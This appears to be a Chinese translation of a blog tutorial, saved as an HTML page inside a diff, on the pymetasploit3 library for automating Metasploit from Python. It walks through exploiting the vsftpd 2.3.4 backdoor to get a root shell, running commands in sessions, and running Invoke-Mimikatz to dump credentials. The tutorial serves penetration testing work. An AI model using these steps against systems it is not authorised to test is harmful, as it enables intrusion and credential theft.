@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>利用 Python3 来实现 Metasploit 自动化</title>
+</head>
+<body>
+<p><a href="https://zhuanlan.zhihu.com/p/78328450">原文</a></p>
+<div class="title-image"><img src="https://pic3.zhimg.com/v2-58b34da2684e34eee543d8ad4d5da9e9_b.jpg" alt=""></div><p>你是否每次渗透测试都有一个要执行的任务列表，例如，SSH 暴力破解或端口映射？又或者使用 Python 和 Metasploit 使它自动化！不幸的是，之前一直没有一个功能齐全的 Python 库来简化这些工作，直到今天……</p><p>Pymetasploit3建立在 allfro 的 pymetasploit 库之上。它使 Metasploit 自动化变得更加容易。由于 pymetasploit3 构建于 Python3 之上，因此您还可以获得 Python3 的 asyncio 库的强大功能并执行自动化任务。</p><figure data-size="normal"><noscript><img src="https://pic1.zhimg.com/v2-bb1da345ca459b2539c7793d4919e474_b.jpg" data-caption="" data-size="normal" data-rawwidth="700" data-rawheight="400" class="origin_image zh-lightbox-thumb" width="700" data-original="https://pic1.zhimg.com/v2-bb1da345ca459b2539c7793d4919e474_r.jpg"/></noscript><img src="https://pic1.zhimg.com/v2-bb1da345ca459b2539c7793d4919e474_b.jpg" data-caption="" data-size="normal" data-rawwidth="700" data-rawheight="400" class="origin_image zh-lightbox-thumb lazy" width="700" data-original="https://pic1.zhimg.com/v2-bb1da345ca459b2539c7793d4919e474_r.jpg" data-actualsrc="https://pic1.zhimg.com/v2-bb1da345ca459b2539c7793d4919e474_b.jpg"/></figure><p class="ztext-empty-paragraph"><br/></p><p><b>安装</b></p><div class="highlight"><pre><code class="language-text">mkdir your-new-project-directory 
+cd your-new-project-directory
+利用 Python3 来实现 Metasploit 自动化
+
+ pipenv install –three pyme tasploit3 
+pipenv shell</code></pre></div><p><b>或者</b></p><div class="highlight"><pre><code class="language-text">pip install --user pyme tasploit3</code></pre></div><p><b>启动 Metasploit RPC server</b></p><p>执行 msfconsole 或者 msfrpcd</p><p><b>Msfconsole</b></p><div class="highlight"><pre><code class="language-text">$ Msfconsole msf&gt; load msgrpc Pass=你的密码</code></pre></div><p><b>Msfrpcd</b></p><div class="highlight"><pre><code class="language-text">$ msfrpcd -P 你的密码</code></pre></div><p><b>使用方法</b></p><p>准备好与 Metasploit 进行互动。 如果您要连接到 msfrpcd 服务，您需创建一个这样的RPC客户端：</p><div class="highlight"><pre><code class="language-text">&gt;&gt;&gt; from pymetasploit3.msfrpc import * 
+&gt;&gt;&gt; client = MsfRpcClient(‘你的密码&#39;)</code></pre></div><p>连接到 msfconsole RPC plugin:</p><div class="highlight"><pre><code class="language-text">&gt;&gt;&gt; from pymetasploit3.msfrpc import * 
+&gt;&gt;&gt; client = MsfRpcClient(&#39;你的密码&#39;, port=55553)</code></pre></div><p>RPC  client是库的核心，所有功能都直接来自这个对象。使用 dir() 可以很容易地查看 Python 库对象:</p><div class="highlight"><pre><code class="language-text">&gt;&gt;&gt; [m for m in dir(client) if not m.startswith(&#39;_&#39;)]
+ &gt;&gt;&gt; [&#39;auth&#39;, &#39;authenticated&#39;, &#39;call&#39;, &#39;client&#39;, &#39;consoles&#39;, &#39;core&#39;, &#39;db&#39;, &#39;jobs&#39;, &#39;login&#39;, &#39;logout&#39;, &#39;modules&#39;, &#39;plugins&#39;, &#39;port&#39;, &#39;server&#39;, &#39;token&#39;, &#39;sessions&#39;, &#39;ssl&#39;, &#39;uri&#39;] 
+&gt;&gt;&gt;</code></pre></div><p>让我们来看下 exploit 模块：</p><div class="highlight"><pre><code class="language-text">&gt;&gt;&gt; client.modules.exploit
+[&#39;windows/wins/ms04_045_wins&#39;, &#39;windows/winrm/winrm_sc ript_exec&#39;, &#39;windows/vpn/safenet_ike_11&#39;,
+&#39;windows/vnc/winvnc_http_get&#39;, &#39;windows/vnc/ultravnc_viewer_bof&#39;, &#39;windows/vnc/ultravnc_client&#39;, ...
+&#39;aix/rpc_ttdbserverd_realpath&#39;, &#39;aix/rpc_cmsd_opcode21&#39;]
+&gt;&gt;&gt;</code></pre></div><p>创建一个 exploit 模块对象很简单。通过 client.modules.use() 传入模块类型以及模块名称。</p><div class="highlight"><pre><code class="language-text">&gt;&gt;&gt; exploit = client.modules.use(&#39;exploit&#39;, &#39;unix/ftp/vsftpd_234_backdoor&#39;) &gt;&gt;&gt;</code></pre></div><p>现在我们设置模块选项。我们首先要看看哪些目标可用并设置合适的目标。</p><div class="highlight"><pre><code class="language-text">&gt;&gt;&gt; exploit.targets
+ {0: &#39;Automatic&#39;}
+&gt;&gt;&gt; 
+&gt;&gt;&gt; exploit.default_target 
+0
+ &gt;&gt;&gt;</code></pre></div><p>在这种情况下，只有一个目标，并且已经设置成默认的。您可以使用具有多个目标的漏洞，并设置它：</p><div class="highlight"><pre><code class="language-text">&gt;&gt;&gt; exploit.target = 0 
+0
+ &gt;&gt;&gt;</code></pre></div><p>让我们找出这个目标的有效载荷：</p><div class="highlight"><pre><code class="language-text">&gt;&gt;&gt; exploit.targetpayloads() 
+[&#39;cmd/unix/interact&#39;] 
+&gt;&gt;&gt;</code></pre></div><p>下一步是查看和设置模块选项。</p><div class="highlight"><pre><code class="language-text">&gt;&gt;&gt; exploit.options
+ [&#39;WORKSPACE&#39;, &#39;VERBOSE&#39;, &#39;WfsDelay&#39;, &#39;EnableContextEncoding&#39;, &#39;ContextInformationFile&#39;, &#39;DisablePayloadHandler&#39;, &#39;RHOSTS&#39;, &#39;RPORT&#39;, &#39;SSL&#39;, &#39;SSLVersion&#39;, &#39;SSLVerifyMode&#39;, &#39;SSLCipher&#39;, &#39;Proxies&#39;, &#39;CPORT&#39;, &#39;CHOST&#39;, &#39;ConnectTimeout&#39;, &#39;TCP::max_send_size&#39;, &#39;TCP::send_delay&#39;]
+ &gt;&gt;&gt;</code></pre></div><p>上面大多数选项都已经设置好了默认值，但是我们如何知道哪些选项是必须要设置的，并且我们如何设置它们？</p><div class="highlight"><pre><code class="language-text">&gt;&gt;&gt; expoit.missing_required
+ [&#39;RHOSTS&#39;]
+ &gt;&gt;&gt; exploit[‘RHOSTS’] = 192.168.1.2 
+&gt;&gt;&gt; exploit.runoptions
+ {&#39;VERBOSE&#39;: False, &#39;WfsDelay&#39;: 0, &#39;EnableContextEncoding&#39;: False, &#39;DisablePayloadHandler&#39;: False, &#39;RPORT&#39;: 21, &#39;SSL&#39;: False, &#39;SSLVersion&#39;: &#39;Auto&#39;, &#39;SSLVerifyMode&#39;: &#39;PEER&#39;, &#39;ConnectTimeout&#39;: 10, &#39;TCP::max_send_size&#39;: 0, &#39;TCP::send_delay&#39;: 0, &#39;RHOSTS&#39;: &#39;192.168.1.2&#39;}
+ &gt;&gt;&gt;</code></pre></div><p>我们在上面的输出中可以看到我们成功地将 RHOSTS 设置为192.168.1.2。 现在我们准备通过在 Metasploit 控制台中运行漏洞来弹出 shell。 Metasploit 控制台是在使用命令 msfconsole 启动 Metasploit 时给出的提示，但如果您使用带有 msfrpcd 的 RPC 守护程序启动 Metasploit，也可以创建控制台。 下面，我们将创建一个新的控制台，获取其控制台 ID，并在该控制台内运行 exploit 模块，以便我们可以收集模块的输出。</p><div class="highlight"><pre><code class="language-text">&gt;&gt;&gt; console_id = client.consoles.console().cid 
+&gt;&gt;&gt; console = client.consoles.console(console_id) 
+&gt;&gt;&gt; console.run_module_with_output(exploit, payload=’cmd/unix/interact’) 
+# Some time passes 
+&#39;VERBOSE =&gt; false\nWfsDelay =&gt; 0 [...] [*] 192.168.1.2:21 - Banner: 220 vsFTPd 2.3.4\n[*] 192.168.1.2:21 - USER: 331 Please specify the password [...]&#39;
+ &gt;&gt;&gt;</code></pre></div><p>现在我们有一个会话，我们与它进行交互。client.sessions.list 将返回一个字典，其中每个键都是会话标识符，并且会话数据将作为值存储。</p><div class="highlight"><pre><code class="language-text">&gt;&gt;&gt; client.sessions.list 
+{&#39;1&#39;: {&#39;info&#39;: &#39;&#39;, &#39;username&#39;: &#39;jsmith&#39;, &#39;session_port&#39;: 21, &#39;via_payload&#39;: &#39;payload/cmd/unix/interact&#39;, &#39;uuid&#39;: &#39;5orqnnyv&#39;, &#39;tunnel_local&#39;: &#39;172.16.14.1:58429&#39;, &#39;via_exploit&#39;: &#39;exploit/unix/ftp/vsftpd_234_backdoor&#39;, &#39;exploit_uuid&#39;: &#39;3whbuevf&#39;, &#39;tunnel_peer&#39;: &#39;192.168.1.2:6200&#39;, &#39;workspace&#39;: &#39;false&#39;, &#39;routes&#39;: &#39;&#39;, &#39;target_host&#39;: &#39;192.168.1.2&#39;, &#39;type&#39;: &#39;shell&#39;, &#39;session_host&#39;: &#39;192.168.1.2&#39;, &#39;desc&#39;: &#39;Command shell&#39;}}
+ &gt;&gt;&gt; shell = client.sessions.session(&#39;1&#39;) 
+&gt;&gt;&gt; shell.write(&#39;whoami&#39;) 
+&gt;&gt;&gt; shell.read() &#39;\nroot&#39; 
+&gt;&gt;&gt;</code></pre></div><p>假设您想在这个会话中运行一个命令，等待命令完成，并返回命令的输出。这在控制台中很简单，因为每个控制台会告诉您，它是否仍在运行您发送的最后一个命令。</p><div class="highlight"><pre><code class="language-text">&gt;&gt;&gt; console.is_busy() 
+False 
+&gt;&gt;&gt;</code></pre></div><p>不幸的是，会话没有来自 Metasploit 提供的 session 内置功能。有三种方法可以解决这个问题。方法一：等待从会话中读取任何数据并返回该数据。这对于一次性打印所有数据的系统命令非常有效。下面，我们将在远程会话上运行 arp 命令，并在接收到任何数据时立即返回。</p><div class="highlight"><pre><code class="language-text">&gt;&gt;&gt; cmd = &#39;arp&#39; 
+&gt;&gt;&gt; shell.run_with_output(cmd) 
+&#39;\n Address                  HWtype  HWaddress           Flags Mask […]&#39;
+ &gt;&gt;&gt;</code></pre></div><p>方法二是等待一段时间，然后在该时间之后返回所有数据。 需要注意的一个细节是，默认情况下，Metasploit 的通讯超时为300秒。 如果您希望运行一个耗时超过300秒的命令，则必须设置 Metasploit 通信超时以及 run_with_output() 的超时。 例如，要将 Meterpreter shell 的通信超时更改为500秒，请在 Meterpreter shell 中运行 set_timeouts -c 500。 下面示例中的 shell 仍然是我们在前面的示例中使用的相同的简单 Linux shell，所以没有必要这样做。</p><div class="highlight"><pre><code class="language-text">&gt;&gt;&gt; cmd = &#39;arp&#39;
+ &gt;&gt;&gt; shell.run_with_output(cmd, timeout=10s, timeout_exception=False) 
+# 10 seconds pass &#39;\n Address                  HWtype  HWaddress           Flags Mask […]&#39;
+ &gt;&gt;&gt;</code></pre></div><p>方法三是在找到某个字符串后停止收集数据。 对于非常复杂的命令，这通常是最一致的。 下面我们将查找字符串“Address”和“HWtype”，我们知道它存在于 Linux上 arp 命令的输出中。 在处理 Meterpreter 会话时，字符串“[ - ]”和“[+]”通常是很好的默认结束字符串，因为当命令完成或失败时，Metasploit 通常会在其输出中使用这些字符串。 但是 Metasploit 的输出在一个命令到下一个命令之间是不一致的，所以要谨慎选择一致的结束字符串，否则您可能会在稍后读取数据缓冲区并让前一个命令的输出扰乱您的新命令的输出。 只要在会话的输出中读取一个选定的结束字符串，就会返回到该时刻之前收集的所有数据。</p><div class="highlight"><pre><code class="language-text">&gt;&gt;&gt; cmd = &#39;arp&#39; 
+&gt;&gt;&gt; end_strs = [&#39;Address&#39;, &#39;HWtype&#39;] 
+&gt;&gt;&gt; shell.run_with_output(cmd, end_strs=end_strs) 
+&#39;\n Address                  HWtype  HWaddress           Flags Mask […]&#39; 
+&gt;&gt;&gt;</code></pre></div><p>假设您在 Windows 主机上获得了 Meterpreter shell，您还可以运行 PowerShell 命令。</p><div class="highlight"><pre><code class="language-text">&gt;&gt;&gt; met_shell = client.sessions.session(&#39;2&#39;) 
+&gt;&gt;&gt; psh_sc ript = &#39;/home/user/sc ripts/Invoke-Mimikatz.ps1&#39; 
+&gt;&gt;&gt; met_shell.import_psh(psh_sc ript) 
+&gt;&gt;&gt; met_shell.run_psh_cmd(&#39;Invoke-Mimikatz&#39;)
+ # Some time passes &#39;Mimikatz output…&#39;
+ &gt;&gt;&gt;</code></pre></div><p>简单概述了一下 pymetasploit3 的基本功能，现在就用一个小 Python 脚本替代你的工具吧！</p><p>来源：<a href="https://link.zhihu.com/?target=https%3A//www.coalfire.com/The-Coalfire-Blog/May-2019/pymetasploit3-Metasploit-Automation-Library" class=" external" target="_blank" rel="nofollow noreferrer"><span class="invisible">https://www.</span><span class="visible">coalfire.com/The-Coalfi</span><span class="invisible">re-Blog/May-2019/pymetasploit3-Metasploit-Automation-Library</span><span class="ellipsis"></span></a></p>
+<script async defer="defer" src="https://www.googletagmanager.com/gtag/js?id=UA-7909075-5"></script>
+<script>
+window.dataLayer = window.dataLayer || [];
+function gtag(){ dataLayer.push(arguments); }
+gtag('js', new Date());
+gtag('config', 'UA-7909075-5');
+</script>
+<script>
+var _hmt = _hmt || [];
+</script>
+<script async defer="defer" src="https://hm.baidu.com/hm.js?e3d40295e416616ddc21287da9646d31"></script>
+</body>
+</html>
